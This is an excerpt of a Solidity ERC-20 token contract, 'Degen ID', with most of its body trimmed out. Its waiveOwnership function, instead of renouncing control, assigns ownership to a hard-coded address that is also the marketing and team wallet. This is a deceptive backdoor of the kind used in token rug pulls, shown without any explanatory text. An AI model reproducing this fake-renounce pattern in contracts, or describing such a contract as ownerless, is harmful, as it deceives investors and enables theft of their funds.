...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x48F7bb918EEaa057f57241223347Dfa25FBcEBf0);
    }
...
contract DegenID is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Degen ID";
    string private _symbol = "DEGENID";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x48F7bb918EEaa057f57241223347Dfa25FBcEBf0);
    address payable private teamWalletAddress = payable(0x48F7bb918EEaa057f57241223347Dfa25FBcEBf0);
